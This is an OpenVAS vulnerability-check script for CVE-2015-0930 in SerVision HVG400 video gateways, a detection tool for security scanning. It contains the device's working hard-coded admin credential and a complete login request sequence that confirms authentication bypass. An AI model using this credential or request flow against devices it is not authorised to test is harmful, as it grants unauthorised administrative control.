###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_servision_hvg_default_cred_vuln.nasl 12051 2018-10-24 09:14:54Z asteins $
#
# SerVision HVG Default Credentials Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807072");
  script_version("$Revision: 12051 $");
  script_cve_id("CVE-2015-0930");
  script_bugtraq_id(72433);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-24 11:14:54 +0200 (Wed, 24 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-02-16 16:15:07 +0530 (Tue, 16 Feb 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("SerVision HVG Default Credentials Vulnerability");

  script_tag(name:"summary", value:"This host is running SerVision HVG and is
  prone to default Hard-Coded Password security bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP POST and
  check whether it is able to bypass authentication or not.");

  script_tag(name:"insight", value:"The flaw is due to SerVision HVG contains
  a hardcoded password that enables a user to log into the web interface with
  administrative rights.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  unauthenticated users to log into the web interface with administrative
  rights and gain administrative privileges on the device.");

  script_tag(name:"affected", value:"SerVision HVG400 Video Gateway devices with
  firmware before 2.2.26a100");

  script_tag(name:"solution", value:"Upgrade to SerVision HVG Video Gateway
  devices with firmware 2.2.26a100 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"https://www.kb.cert.org/vuls/id/522460");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Feb/57");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Default Accounts");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.servision.net");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

hvgPort = get_http_port(default:8080);

url = "/index.htm";
buf = http_get_cache(item:url, port:hvgPort);

if('user_username' >< buf && 'user_password' >< buf)
{

  host = http_host_name(port:hvgPort);

  postData = string('user_username=admin&user_password=Bantham&LOADED=1&TO_LOAD=index.htm');

  #Send Attack Request and Receive response
  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData), "\r\n",
               "\r\n", postData, "\r\n");
  res = http_send_recv(port:hvgPort, data:req);

  cookie = eregmatch( pattern:"Set-Cookie: ([0-9a-zA-Z=]+);", string:res );
  if(!cookie[1]){
    exit(0);
  }

  if (res && res =~ "HTTP\/1\.[0-9] 201 OK")
  {
    req = string("GET /top.htm HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Cookie: ", cookie[1], "\r\n",
                 "Connection: keep-alive\r\n\r\n");
    res = http_keepalive_send_recv(port:hvgPort, data:req);

    if(res =~ "HTTP\/1\.[0-9] 200 OK" && "Logout" >< res)
    {
      report = report_vuln_url( port:hvgPort, url:url );
      security_message(port:hvgPort, data:report);
      exit(0);
    }
  }
}
